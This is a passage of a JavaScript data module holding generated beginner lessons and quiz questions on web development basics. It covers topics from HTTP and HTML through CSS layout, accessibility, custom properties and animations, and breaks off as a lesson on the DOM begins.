// Lesson text and quiz questions for "Web Development Basics".
// Loaded on demand by loadLevelContent() in ../tracks.js — never in the main bundle.
// Generated content: regenerate rather than hand-editing.

export default {
 "webdev-1": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "The web is built on a simple conversation between two roles: a client and a server. The client is your browser (Chrome, Firefox, Edge). The server is a computer somewhere on the internet that stores websites and waits to hand them out when asked."
    },
    {
     "type": "text",
     "text": "When you type an address like example.com, your browser sends a request over the network. The server receives it, finds the right page, and sends back a response — usually HTML, CSS, and JavaScript files. Your browser then reads those files and paints the page on screen."
    },
    {
     "type": "tip",
     "text": "Think of it like a restaurant: you (the client) order from a menu, the kitchen (the server) prepares your dish, and a waiter (the network) carries the request and the food back and forth."
    },
    {
     "type": "text",
     "text": "This request-and-response cycle uses a set of rules called HTTP (HyperText Transfer Protocol). HTTPS is the same thing but encrypted, so nobody in between can read your data. Each page you visit is one or more of these request/response trips."
    },
    {
     "type": "text",
     "text": "A domain name like example.com is human-friendly, but computers find each other using numeric IP addresses. The DNS (Domain Name System) acts like a phone book, translating the name you type into the IP address of the server that hosts the site."
    }
   ],
   "recap": "The web works by a client (browser) sending an HTTP request and a server sending back a response, with DNS translating domain names into server addresses."
  },
  "quiz": [
   {
    "q": "In web terms, what is the 'client'?",
    "options": [
     "The web browser making requests",
     "The domain name",
     "The server's database",
     "The internet cable"
    ],
    "answer": 0,
    "explain": "The client is the browser that sends requests and displays the response."
   },
   {
    "q": "What does DNS do?",
    "options": [
     "Speeds up your Wi-Fi",
     "Translates a domain name into an IP address",
     "Encrypts your password",
     "Stores website images"
    ],
    "answer": 1,
    "explain": "DNS acts like a phone book, mapping human-friendly names to numeric IP addresses."
   },
   {
    "q": "What is the main difference between HTTP and HTTPS?",
    "options": [
     "There is no difference",
     "HTTP is faster and newer",
     "HTTPS only works on phones",
     "HTTPS is encrypted and more secure"
    ],
    "answer": 3,
    "explain": "HTTPS is HTTP with encryption, protecting data as it travels between client and server."
   }
  ]
 },
 "webdev-2": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "HTML (HyperText Markup Language) is the skeleton of every web page. It doesn't make things pretty — it defines structure and meaning: this is a heading, this is a paragraph, this is a list. The browser reads this structure to build the page."
    },
    {
     "type": "text",
     "text": "HTML is made of tags. Most come in pairs: an opening tag like <p> and a closing tag like </p>, with content in between. The whole thing — tags plus content — is called an element. Some tags, like <img>, are self-closing and stand alone."
    },
    {
     "type": "code",
     "lang": "html",
     "code": "<!DOCTYPE html>\n<html>\n  <head>\n    <title>My First Page</title>\n  </head>\n  <body>\n    <h1>Hello, Web!</h1>\n    <p>This is my first paragraph.</p>\n  </body>\n</html>"
    },
    {
     "type": "text",
     "text": "Every page has a basic shape. <!DOCTYPE html> tells the browser this is modern HTML. <html> wraps everything. <head> holds information about the page (like its title, shown in the browser tab). <body> holds everything you actually see on the page."
    },
    {
     "type": "tip",
     "text": "Tags nest like boxes inside boxes. Always close them in the reverse order you opened them — <body><h1>...</h1></body>, never crossed over."
    }
   ],
   "recap": "HTML uses paired tags to build page structure, with the visible content going inside <body> and page info inside <head>."
  },
  "quiz": [
   {
    "q": "What does an HTML tag pair plus its content form?",
    "options": [
     "A stylesheet",
     "A server",
     "A protocol",
     "An element"
    ],
    "answer": 3,
    "explain": "A tag pair together with the content between them is called an element."
   },
   {
    "q": "Where does the visible content of a page go?",
    "options": [
     "Inside <body>",
     "Inside <head>",
     "Inside <title>",
     "Inside <!DOCTYPE>"
    ],
    "answer": 0,
    "explain": "The <body> element holds everything the user actually sees on the page."
   },
   {
    "q": "What is the purpose of <!DOCTYPE html>?",
    "options": [
     "It links a stylesheet",
     "It creates a heading",
     "It tells the browser this is modern HTML",
     "It closes the page"
    ],
    "answer": 2,
    "explain": "<!DOCTYPE html> declares the document as modern HTML so the browser renders it correctly."
   },
   {
    "q": "Which tag typically holds the page title shown in the browser tab?",
    "options": [
     "<title>",
     "<h1>",
     "<p>",
     "<body>"
    ],
    "answer": 0,
    "explain": "The <title> tag, placed in <head>, sets the text shown on the browser tab."
   }
  ]
 },
 "webdev-3": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "Now let's fill the body with real content. Headings run from <h1> (most important) down to <h6> (least). Paragraphs use <p>. Use headings for structure and hierarchy, not just to make text big — screen readers and search engines rely on that hierarchy."
    },
    {
     "type": "text",
     "text": "Links are what make the web a 'web'. The anchor tag <a> creates a clickable link. Its href attribute holds the destination URL. An attribute is extra info written inside the opening tag as name=\"value\"."
    },
    {
     "type": "code",
     "lang": "html",
     "code": "<a href=\"https://example.com\">Visit Example</a>\n\n<img src=\"logo.png\" alt=\"Company logo\">"
    },
    {
     "type": "text",
     "text": "Images use the <img> tag. The src attribute points to the image file. The alt attribute gives a text description shown if the image fails to load — and read aloud to visually impaired users. Always write meaningful alt text."
    },
    {
     "type": "tip",
     "text": "A link's text should describe where it goes. 'Read the docs' is far better than 'click here' — both for accessibility and for people scanning the page."
    }
   ],
   "recap": "Use <h1>–<h6> and <p> for text, <a href> for links, and <img src alt> for images, where attributes carry extra info like the destination or description."
  },
  "quiz": [
   {
    "q": "Which attribute holds a link's destination?",
    "options": [
     "alt",
     "href",
     "link",
     "src"
    ],
    "answer": 1,
    "explain": "The href attribute of an <a> tag specifies the URL the link points to."
   },
   {
    "q": "What is the alt attribute of an image for?",
    "options": [
     "Setting image width",
     "A text description for accessibility and fallback",
     "Linking to another page",
     "Choosing a color"
    ],
    "answer": 1,
    "explain": "The alt attribute describes the image for screen readers and when the image fails to load."
   },
   {
    "q": "Which heading level is the most important?",
    "options": [
     "<h3>",
     "<h1>",
     "<h6>",
     "<p>"
    ],
    "answer": 1,
    "explain": "<h1> is the top-level, most important heading; importance decreases toward <h6>."
   },
   {
    "q": "In src=\"logo.png\", what is 'src' called?",
    "options": [
     "An element",
     "An attribute",
     "A protocol",
     "A tag"
    ],
    "answer": 1,
    "explain": "src is an attribute — extra information written inside the opening tag as name=\"value\"."
   }
  ]
 },
 "webdev-4": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "If HTML is the skeleton, CSS (Cascading Style Sheets) is the skin and clothing. CSS controls how things look: colors, fonts, sizes, spacing, and layout. Keeping style separate from structure means you can restyle a whole site without touching the HTML."
    },
    {
     "type": "text",
     "text": "A CSS rule has two parts: a selector (what to style) and a declaration block (how to style it). Inside the block, you write property: value pairs, each ending with a semicolon."
    },
    {
     "type": "code",
     "lang": "css",
     "code": "p {\n  color: navy;\n  font-size: 16px;\n}\n\n.highlight {\n  background-color: yellow;\n}\n\n#header {\n  text-align: center;\n}"
    },
    {
     "type": "text",
     "text": "Selectors decide what gets styled. A tag selector like p targets every paragraph. A class selector starts with a dot (.highlight) and targets any element with class=\"highlight\". An id selector starts with a hash (#header) and targets the one element with that unique id."
    },
    {
     "type": "text",
     "text": "You usually connect CSS to HTML by linking an external file in the <head>: <link rel=\"stylesheet\" href=\"styles.css\">. This keeps all your styling in one reusable place shared across many pages."
    },
    {
     "type": "tip",
     "text": "The 'cascading' in CSS means rules can stack and override each other. When two rules clash, more specific selectors (id beats class beats tag) and later rules generally win."
    }
   ],
   "recap": "CSS styles pages with rules made of a selector plus property:value declarations, using tag, class (.), or id (#) selectors, usually linked from an external stylesheet."
  },
  "quiz": [
   {
    "q": "How do you select all elements with class=\"box\" in CSS?",
    "options": [
     "#box",
     "*box",
     "box",
     ".box"
    ],
    "answer": 3,
    "explain": "A class selector starts with a dot, so .box targets every element with that class."
   },
   {
    "q": "What are the two main parts of a CSS rule?",
    "options": [
     "Head and body",
     "Client and server",
     "Tag and attribute",
     "Selector and declaration block"
    ],
    "answer": 3,
    "explain": "A rule is a selector (what to style) followed by a declaration block (how to style it)."
   },
   {
    "q": "Which selector targets a single unique element by its id?",
    "options": [
     "@main",
     "main",
     ".main",
     "#main"
    ],
    "answer": 3,
    "explain": "An id selector begins with a hash, so #main targets the one element with id=\"main\"."
   },
   {
    "q": "Why keep CSS separate from HTML?",
    "options": [
     "It encrypts the page",
     "It makes pages load offline",
     "It is required by DNS",
     "You can restyle the site without changing structure"
    ],
    "answer": 3,
    "explain": "Separating style from structure lets you change the look everywhere without editing the HTML."
   }
  ]
 },
 "webdev-5": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "Here's a big idea that unlocks CSS layout: every element on a page is a rectangular box. Understanding how that box is sized is the key to controlling spacing and layout. This is called the box model."
    },
    {
     "type": "text",
     "text": "Each box has four layers, from inside out: the content (the text or image itself), the padding (space between content and the border), the border (a line around the padding), and the margin (space outside the border, pushing other elements away)."
    },
    {
     "type": "tip",
     "text": "Picture a framed photo: the photo is the content, the mat around it is the padding, the frame is the border, and the empty wall space keeping it away from the next frame is the margin."
    },
    {
     "type": "code",
     "lang": "css",
     "code": ".card {\n  width: 200px;\n  padding: 20px;\n  border: 2px solid gray;\n  margin: 16px;\n  box-sizing: border-box;\n}"
    },
    {
     "type": "text",
     "text": "By default, width sets only the content width — padding and border are added on top, making the box bigger than you might expect. Setting box-sizing: border-box changes this so width includes padding and border, which makes layouts far more predictable."
    },
    {
     "type": "text",
     "text": "Padding adds space inside the box (it pushes the border outward and often changes the visible background area), while margin adds space outside it. Mixing these two up is one of the most common beginner layout bugs, so name them carefully in your head: inside vs outside."
    }
   ],
   "recap": "Every element is a box with content, padding (inside), border, and margin (outside); box-sizing: border-box makes width include padding and border for predictable sizing."
  },
  "quiz": [
   {
    "q": "Which layer of the box model is the space OUTSIDE the border?",
    "options": [
     "Padding",
     "Content",
     "Border",
     "Margin"
    ],
    "answer": 3,
    "explain": "Margin is the space outside the border that pushes neighboring elements away."
   },
   {
    "q": "What does padding do?",
    "options": [
     "Adds space between content and border",
     "Adds space outside the box",
     "Draws a line around the box",
     "Sets the text color"
    ],
    "answer": 0,
    "explain": "Padding is the space inside the box, between the content and the border."
   },
   {
    "q": "What does box-sizing: border-box change?",
    "options": [
     "width now includes padding and border",
     "It hides the border",
     "It removes the margin",
     "It centers the element"
    ],
    "answer": 0,
    "explain": "With border-box, the declared width includes padding and border, making sizing predictable."
   },
   {
    "q": "Listed from inside to outside, the box model layers are:",
    "options": [
     "Border, content, margin, padding",
     "Margin, border, padding, content",
     "Content, padding, border, margin",
     "Padding, content, margin, border"
    ],
    "answer": 2,
    "explain": "From the inside out the order is content, padding, border, then margin."
   }
  ]
 },
 "webdev-6": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "Forms are how users send data back to the server — logging in, searching, signing up, checking out. Everything you type into a website flows through a form. The <form> element wraps a group of input controls."
    },
    {
     "type": "text",
     "text": "The workhorse is the <input> tag. Its type attribute changes its behavior: text for plain text, email for addresses, password to hide characters, number, checkbox, radio, and more. Each input should have a matching <label> so users (and screen readers) know what it's for."
    },
    {
     "type": "code",
     "lang": "html",
     "code": "<form action=\"/submit\" method=\"post\">\n  <label for=\"email\">Email:</label>\n  <input type=\"email\" id=\"email\" name=\"email\" required>\n\n  <label for=\"pw\">Password:</label>\n  <input type=\"password\" id=\"pw\" name=\"pw\">\n\n  <button type=\"submit\">Log In</button>\n</form>"
    },
    {
     "type": "text",
     "text": "The form's action attribute is the URL where the data is sent; method is how it's sent. GET appends data to the URL (good for searches); POST sends it in the request body (used for logins and anything sensitive or that changes data). Each input's name attribute becomes the label under which its value is delivered to the server."
    },
    {
     "type": "text",
     "text": "The required attribute makes a field mandatory, and types like email trigger built-in browser validation — the browser checks the format before the form is even sent. This is a first line of defense, but never the only one."
    },
    {
     "type": "tip",
     "text": "Browser validation is a convenience, not security. Always validate and sanitize data again on the server, because a determined user can bypass anything the browser checks."
    }
   ],
   "recap": "Forms collect user input with <input> controls and labels, then send it to the action URL via GET or POST, with each field's name carrying its value to the server."
  },
  "quiz": [
   {
    "q": "Which method is appropriate for sending a password on login?",
    "options": [
     "DNS",
     "GET, because it's faster",
     "POST, because data goes in the request body",
     "Neither; forms can't send passwords"
    ],
    "answer": 2,
    "explain": "POST places data in the request body rather than the URL, which suits sensitive data like passwords."
   },
   {
    "q": "What connects a <label> to its input for accessibility?",
    "options": [
     "The action attribute",
     "The method attribute",
     "The label's color",
     "The for attribute matching the input's id"
    ],
    "answer": 3,
    "explain": "A label's for attribute must match the input's id so they are linked together."
   },
   {
    "q": "Where is submitted form data sent?",
    "options": [
     "To the browser cache",
     "To the DNS server",
     "To the URL in the action attribute",
     "Nowhere; it stays local"
    ],
    "answer": 2,
    "explain": "The form's action attribute specifies the URL that receives the submitted data."
   },
   {
    "q": "Why should you validate form data on the server, not just in the browser?",
    "options": [
     "Servers are slower",
     "The browser cannot validate",
     "Browser validation can be bypassed",
     "It saves DNS lookups"
    ],
    "answer": 2,
    "explain": "A user can bypass browser checks, so the server must validate data as the real line of defense."
   }
  ]
 },
 "webdev-7": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "People visit sites on phones, tablets, laptops, and huge monitors. A responsive design adapts its layout to whatever screen it's on, instead of forcing a single fixed width. This is now the baseline expectation for any professional site."
    },
    {
     "type": "text",
     "text": "It starts with one line in the <head>: the viewport meta tag. Without it, phones pretend to be a wide desktop and shrink your page to a tiny, unreadable version. This tag tells the phone to use its real width."
    },
    {
     "type": "code",
     "lang": "html",
     "code": "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">"
    },
    {
     "type": "text",
     "text": "Next, prefer flexible units over fixed pixels. Percentages, and units like rem, em, vw, and vh, let elements scale with the screen or font size. Modern layout tools — Flexbox (one-dimensional rows or columns) and CSS Grid (two-dimensional layouts) — are built to reflow content gracefully as space changes."
    },
    {
     "type": "text",
     "text": "The real power comes from media queries. A media query applies CSS only when a condition is true, such as the screen being narrower than a certain width. This lets you rearrange or resize things specifically for small screens."
    },
    {
     "type": "code",
     "lang": "css",
     "code": ".menu {\n  display: flex;\n  flex-direction: row;\n}\n\n@media (max-width: 600px) {\n  .menu {\n    flex-direction: column;\n  }\n}"
    },
    {
     "type": "tip",
     "text": "Design mobile-first: write your base styles for small screens, then use media queries with min-width to add complexity as the screen grows. It's usually simpler than shrinking a desktop design down."
    }
   ],
   "recap": "Responsive design adapts to any screen using the viewport meta tag, flexible units, Flexbox/Grid, and media queries that apply CSS conditionally based on screen size."
  },
  "quiz": [
   {
    "q": "What does a CSS media query let you do?",
    "options": [
     "Encrypt the page",
     "Play audio files",
     "Connect to a database",
     "Apply CSS only when a condition like screen width is met"
    ],
    "answer": 3,
    "explain": "A media query applies its CSS rules only when its condition (e.g., a max-width) is true."
   },
   {
    "q": "Why is the viewport meta tag important on mobile?",
    "options": [
     "It speeds up DNS",
     "It blocks ads",
     "It makes the phone use its real width instead of faking a desktop",
     "It adds a border"
    ],
    "answer": 2,
    "explain": "Without it phones assume a desktop width and shrink the page; the tag makes them use the actual device width."
   },
   {
    "q": "Which is a two-dimensional CSS layout system?",
    "options": [
     "Media queries",
     "The box model",
     "CSS Grid",
     "Flexbox"
    ],
    "answer": 2,
    "explain": "CSS Grid handles two-dimensional layouts (rows and columns together), while Flexbox is one-dimensional."
   },
   {
    "q": "What does 'mobile-first' design mean?",
    "options": [
     "Writing base styles for small screens, then enhancing for larger ones",
     "Using only pixels",
     "Testing on a phone last",
     "Only supporting phones"
    ],
    "answer": 0,
    "explain": "Mobile-first means starting with small-screen styles and adding complexity as the screen grows."
   }
  ]
 },
 "webdev-8": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "Flexbox is a one-dimensional layout system: it arranges items in a single row or a single column and gives you fine control over how they share space. You turn any element into a flex container with one line of CSS, and every direct child becomes a flex item."
    },
    {
     "type": "code",
     "lang": "css",
     "code": ".nav {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  gap: 16px;\n}"
    },
    {
     "type": "text",
     "text": "justify-content controls spacing along the main axis (by default, left to right): options like flex-start, center, space-between, and space-around. align-items controls the cross axis (by default, top to bottom): flex-start, center, stretch, and so on."
    },
    {
     "type": "text",
     "text": "Individual items can also grow, shrink, or take a fixed share of space using flex-grow, flex-shrink, and flex-basis, usually written together as the flex shorthand. flex: 1 tells an item to grow and fill any leftover space equally with its siblings."
    },
    {
     "type": "code",
     "lang": "css",
     "code": ".card {\n  flex: 1;\n}\n.sidebar {\n  flex: 0 0 250px;\n}"
    },
    {
     "type": "tip",
     "text": "flex-direction: row is the default main axis; set flex-direction: column to flip everything so justify-content and align-items swap which axis they control."
    }
   ],
   "recap": "Flexbox lays out items along one axis at a time; justify-content and align-items position them, while flex-grow/shrink/basis decide how they share leftover space."
  },
  "quiz": [
   {
    "q": "What kind of layout system is Flexbox?",
    "options": [
     "Only for text",
     "A database layout",
     "One-dimensional, a single row or column",
     "Two-dimensional, like a spreadsheet"
    ],
    "answer": 2,
    "explain": "Flexbox arranges items along a single axis, either a row or a column, at a time."
   },
   {
    "q": "Which property spaces items apart along the main axis?",
    "options": [
     "flex-direction",
     "justify-content",
     "align-items",
     "gap-axis"
    ],
    "answer": 1,
    "explain": "justify-content controls how items are distributed along the main axis, e.g. space-between or center."
   },
   {
    "q": "What does flex: 1 do to an item?",
    "options": [
     "Hides the item",
     "Fixes its width to 1px",
     "Lets it grow to share leftover space equally with siblings",
     "Rotates it 1 degree"
    ],
    "answer": 2,
    "explain": "flex: 1 sets flex-grow to 1, so the item expands to fill available space alongside other flexible siblings."
   },
   {
    "q": "Which property flips the main axis from a row to a column?",
    "options": [
     "flex-direction",
     "flex-wrap",
     "align-self",
     "justify-content"
    ],
    "answer": 0,
    "explain": "flex-direction: column changes the main axis to run top to bottom instead of left to right."
   }
  ]
 },
 "webdev-9": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "CSS Grid is a two-dimensional layout system: it controls rows and columns together, which makes it ideal for whole page layouts rather than a single strip of items. You declare a grid on a container, then define its columns and rows."
    },
    {
     "type": "code",
     "lang": "css",
     "code": ".page {\n  display: grid;\n  grid-template-columns: 200px 1fr 1fr;\n  grid-template-rows: auto 1fr auto;\n  gap: 20px;\n}"
    },
    {
     "type": "text",
     "text": "The fr unit means a fraction of the remaining free space, so 1fr 1fr splits leftover space evenly between two columns. gap adds spacing between rows and columns without needing margins on every item."
    },
    {
     "type": "text",
     "text": "You can place an item explicitly using grid-column and grid-row, letting it span multiple tracks. This is how a header or footer can stretch across every column while content sits in the middle row."
    },
    {
     "type": "code",
     "lang": "css",
     "code": ".header {\n  grid-column: 1 / -1;\n}"
    },
    {
     "type": "tip",
     "text": "Grid and Flexbox are not rivals: use Grid for the overall page skeleton, and Flexbox inside individual grid cells (like a navbar or a card's content) for one-dimensional alignment."
    }
   ],
   "recap": "CSS Grid lays out rows and columns together as a two-dimensional system; the fr unit shares free space, and grid-column/grid-row let items span multiple tracks."
  },
  "quiz": [
   {
    "q": "What makes CSS Grid different from Flexbox?",
    "options": [
     "Grid cannot have gaps",
     "Grid controls rows and columns together, two dimensions at once",
     "Grid only works on text",
     "Grid is older than Flexbox"
    ],
    "answer": 1,
    "explain": "Grid is a two-dimensional system, handling rows and columns simultaneously, unlike Flexbox's single axis."
   },
   {
    "q": "What does the fr unit represent?",
    "options": [
     "A percentage of the viewport height",
     "A fixed number of pixels",
     "A font size ratio",
     "A fraction of the remaining free space"
    ],
    "answer": 3,
    "explain": "fr divides the leftover space in the grid container proportionally among tracks."
   },
   {
    "q": "grid-column: 1 / -1 makes an item do what?",
    "options": [
     "Move to row 1",
     "Span from the first line to the last line, across all columns",
     "Shrink to 1px wide",
     "Disappear"
    ],
    "answer": 1,
    "explain": "1 / -1 spans from the first grid line to the last, stretching the item across the full width."
   },
   {
    "q": "Which is a sensible combined approach?",
    "options": [
     "Never use Flexbox once you use Grid",
     "Use only inline styles",
     "Use Grid for the page skeleton and Flexbox inside individual cells",
     "Use Grid only for images"
    ],
    "answer": 2,
    "explain": "Grid suits the overall two-dimensional layout, while Flexbox is handy for one-dimensional alignment within a section."
   }
  ]
 },
 "webdev-10": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "The position property decides how an element is placed on the page. static is the default, where the element just follows normal document flow. relative shifts an element from its normal spot without removing it from flow, using top, left, right, and bottom."
    },
    {
     "type": "text",
     "text": "absolute removes an element from flow entirely and positions it relative to its nearest ancestor that has any position other than static. fixed positions relative to the browser window itself and stays put even when the page scrolls, useful for sticky headers."
    },
    {
     "type": "code",
     "lang": "css",
     "code": ".modal-backdrop {\n  position: fixed;\n  inset: 0;\n  background: rgba(0,0,0,0.5);\n}\n.modal {\n  position: absolute;\n  top: 50%;\n  left: 50%;\n  transform: translate(-50%, -50%);\n}"
    },
    {
     "type": "text",
     "text": "When elements overlap, z-index decides which sits on top. Higher numbers stack above lower ones, but z-index only works on elements that have a position value other than static."
    },
    {
     "type": "tip",
     "text": "A very common bug: z-index does nothing until you also set position (relative, absolute, fixed, or sticky) on that element."
    }
   ],
   "recap": "position controls how an element is placed (static, relative, absolute, or fixed), and z-index controls stacking order for overlapping positioned elements."
  },
  "quiz": [
   {
    "q": "Which position value keeps an element fixed to the viewport even while scrolling?",
    "options": [
     "static",
     "relative",
     "inherit",
     "fixed"
    ],
    "answer": 3,
    "explain": "position: fixed anchors an element to the browser window, so it stays visible during scrolling."
   },
   {
    "q": "An absolutely positioned element is placed relative to what?",
    "options": [
     "Its parent's font size",
     "Always the whole document",
     "The mouse cursor",
     "Its nearest ancestor with a non-static position"
    ],
    "answer": 3,
    "explain": "absolute positioning is relative to the closest ancestor that has position set to something other than static."
   },
   {
    "q": "Why might z-index have no visible effect on an element?",
    "options": [
     "The value is too large",
     "z-index is deprecated",
     "The element's position is still static",
     "z-index only works on images"
    ],
    "answer": 2,
    "explain": "z-index only applies to positioned elements; static elements ignore it entirely."
   },
   {
    "q": "Which position value keeps the element in normal flow but lets you nudge it with top/left offsets?",
    "options": [
     "fixed",
     "relative",
     "sticky-only",
     "absolute"
    ],
    "answer": 1,
    "explain": "relative positioning shifts the element visually while it still occupies its original space in the flow."
   }
  ]
 },
 "webdev-11": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "Semantic HTML means choosing tags for their meaning, not just their look. Instead of wrapping everything in generic <div> tags, use <header>, <nav>, <main>, <article>, <section>, and <footer> so both browsers and screen readers understand the page's structure."
    },
    {
     "type": "code",
     "lang": "html",
     "code": "<header>\n  <nav>...</nav>\n</header>\n<main>\n  <article>\n    <h1>Title</h1>\n    <p>Content...</p>\n  </article>\n</main>\n<footer>...</footer>"
    },
    {
     "type": "text",
     "text": "Accessibility (often shortened to a11y) means building sites that work for everyone, including people using screen readers, keyboard-only navigation, or low vision. Semantic tags are the first step, because screen readers announce them by role automatically."
    },
    {
     "type": "text",
     "text": "Images need an alt attribute describing their content for people who cannot see them; it should be empty (alt=\"\") for purely decorative images so screen readers skip them. Interactive elements should be reachable and operable with the keyboard alone (Tab, Enter, Space), not just a mouse."
    },
    {
     "type": "text",
     "text": "When no native HTML element fits, ARIA attributes like role, aria-label, and aria-hidden can describe custom widgets to assistive technology. But the rule of thumb is to prefer a real semantic element over ARIA whenever one exists."
    },
    {
     "type": "tip",
     "text": "\"No ARIA is better than bad ARIA.\" Always reach for a native tag like <button> before reaching for role=\"button\" on a <div>; the native tag already gets keyboard and screen-reader support for free."
    }
   ],
   "recap": "Semantic HTML tags describe meaning and structure, which browsers and screen readers use automatically; accessibility also needs alt text, keyboard support, and ARIA only where no native element exists."
  },
  "quiz": [
   {
    "q": "Why prefer <nav> over a generic <div> for a navigation menu?",
    "options": [
     "It requires less CSS",
     "Screen readers and browsers understand its role automatically",
     "It is required by HTML5 syntax rules",
     "It loads faster over the network"
    ],
    "answer": 1,
    "explain": "Semantic tags like <nav> carry built-in meaning that assistive technology can announce without extra work."
   },
   {
    "q": "What should the alt attribute of a purely decorative image be?",
    "options": [
     "A long description",
     "The image's file name",
     "An empty string",
     "Omitted entirely"
    ],
    "answer": 2,
    "explain": "An empty alt=\"\" tells screen readers to skip the decorative image rather than reading something meaningless."
   },
   {
    "q": "What is the general rule about ARIA attributes?",
    "options": [
     "Prefer a native semantic element before reaching for ARIA",
     "Always add ARIA to every element",
     "ARIA only works in Chrome",
     "ARIA replaces the need for alt text"
    ],
    "answer": 0,
    "explain": "Native elements like <button> already have accessibility behavior built in; ARIA should fill gaps, not replace native tags."
   },
   {
    "q": "Why must interactive elements work with the keyboard alone?",
    "options": [
     "Some users cannot use a mouse and rely on keyboard or switch navigation",
     "Browsers require it to render CSS",
     "It reduces file size",
     "Keyboards are faster than mice"
    ],
    "answer": 0,
    "explain": "Keyboard-only and switch-device users need every interactive control to be reachable and operable without a mouse."
   }
  ]
 },
 "webdev-12": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "A CSS custom property, commonly called a CSS variable, lets you store a value once and reuse it anywhere in your stylesheet. You define one with a double-dash name, usually on :root so it's available globally."
    },
    {
     "type": "code",
     "lang": "css",
     "code": ":root {\n  --brand-color: #3b82f6;\n  --spacing: 12px;\n}\n\n.button {\n  background: var(--brand-color);\n  padding: var(--spacing);\n}"
    },
    {
     "type": "text",
     "text": "You read a variable with the var() function, which can also take a fallback value used if the variable is undefined: var(--gap, 8px). Because variables are live, changing one value updates every rule that uses it, instead of hunting through the whole file."
    },
    {
     "type": "text",
     "text": "Custom properties can also be overridden inside a specific selector, which is exactly how a light/dark theme switch usually works: the same variable name gets a different value depending on a class on the <html> or <body> tag."
    },
    {
     "type": "code",
     "lang": "css",
     "code": "body.dark {\n  --brand-color: #93c5fd;\n  --bg: #111;\n}"
    },
    {
     "type": "tip",
     "text": "Unlike Sass variables, CSS custom properties are real runtime values: JavaScript can read and change them too, with element.style.setProperty('--brand-color', 'red'), which makes them perfect for interactive theming."
    }
   ],
   "recap": "CSS custom properties (--name) store reusable values, read with var(), and can be overridden per selector to build things like theme switching, updating live wherever they're used."
  },
  "quiz": [
   {
    "q": "How do you read the value of a CSS custom property?",
    "options": [
     "property()",
     "get()",
     "custom()",
     "var()"
    ],
    "answer": 3,
    "explain": "The var() function retrieves the value of a custom property, optionally with a fallback."
   },
   {
    "q": "Where are CSS custom properties usually declared to be globally available?",
    "options": [
     ":root",
     "<head>",
     "body::after",
     "@media"
    ],
    "answer": 0,
    "explain": ":root targets the top of the document, making variables declared there available everywhere."
   },
   {
    "q": "What is a key advantage of CSS custom properties over Sass variables?",
    "options": [
     "They compile faster",
     "They only work in Firefox",
     "They cannot be overridden",
     "They are live runtime values that JavaScript can also read and change"
    ],
    "answer": 3,
    "explain": "Custom properties exist in the browser at runtime, so JavaScript can update them dynamically, unlike Sass variables which are resolved at compile time."
   },
   {
    "q": "What does var(--gap, 8px) do if --gap is not defined?",
    "options": [
     "Renders as 0",
     "Causes an error",
     "Falls back to 8px",
     "Ignores the whole rule"
    ],
    "answer": 2,
    "explain": "The second argument to var() is a fallback value used only when the custom property is missing or invalid."
   }
  ]
 },
 "webdev-13": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "A transition smoothly animates a CSS property from its old value to its new value whenever that value changes, such as on hover. You specify which property to animate, how long it takes, and optionally a timing curve."
    },
    {
     "type": "code",
     "lang": "css",
     "code": ".button {\n  background: steelblue;\n  transition: background 0.3s ease, transform 0.3s ease;\n}\n.button:hover {\n  background: darkblue;\n  transform: scale(1.05);\n}"
    },
    {
     "type": "text",
     "text": "Transitions need a trigger, like :hover, a class toggled by JavaScript, or a media query. For animations that run on their own, without a trigger, or that need multiple steps, you use @keyframes instead."
    },
    {
     "type": "code",
     "lang": "css",
     "code": "@keyframes spin {\n  from { transform: rotate(0deg); }\n  to   { transform: rotate(360deg); }\n}\n.loader {\n  animation: spin 1s linear infinite;\n}"
    },
    {
     "type": "text",
     "text": "Keyframes let you define any number of stops (0%, 50%, 100%, and so on), each with its own styles, and the browser interpolates smoothly between them. The animation property then controls duration, timing, repeat count, and direction."
    },
    {
     "type": "tip",
     "text": "For the smoothest animations, prefer animating transform and opacity over properties like width, top, or margin — the browser can move and fade these on the GPU without recalculating the page layout on every frame."
    }
   ],
   "recap": "transition animates a property change smoothly when triggered by something like :hover, while @keyframes plus animation define self-running, multi-step animations; transform and opacity animate most smoothly."
  },
  "quiz": [
   {
    "q": "What triggers a CSS transition to run?",
    "options": [
     "Only page load",
     "The @keyframes rule",
     "Nothing, it runs automatically forever",
     "A change in the animated property's value, such as on :hover"
    ],
    "answer": 3,
    "explain": "A transition only plays when the watched property's value actually changes, commonly triggered by a state like :hover or a toggled class."
   },
   {
    "q": "What do you use for a self-running, multi-step animation with no trigger needed?",
    "options": [
     "The var() function",
     "@keyframes with the animation property",
     "z-index",
     "transition alone"
    ],
    "answer": 1,
    "explain": "@keyframes defines the animation's steps, and the animation property applies it, running independently of any trigger."
   },
   {
    "q": "Which properties are best to animate for smooth, GPU-friendly performance?",
    "options": [
     "top and margin",
     "transform and opacity",
     "width and height",
     "font-family and color"
    ],
    "answer": 1,
    "explain": "transform and opacity can be animated without forcing the browser to recompute page layout, making them the smoothest to animate."
   },
   {
    "q": "In a @keyframes rule, what do percentages like 0% and 50% represent?",
    "options": [
     "Opacity levels",
     "Points in time through the animation",
     "File sizes",
     "Screen widths"
    ],
    "answer": 1,
    "explain": "Each percentage marks a point in the animation's timeline, with its own styles that the browser interpolates between."
   }
  ]
 },
 "webdev-14": {
  "lesson": {
   "blocks": [
    {
     "type": "text",
     "text": "The Document Object Model, or DOM, is how the browser represents a web page in memory: every tag becomes an object that JavaScript can read and change. This is what turns a static HTML page into something that reacts while it's running."
    },
    {
     "type": "code",
     "lang": "javascript",
     "code": "const heading = document.querySelector('h1');\nheading.textContent = 'Welcome back!';\nheading.style.color = 'darkgreen';"
    },
    {
     "type": "text",
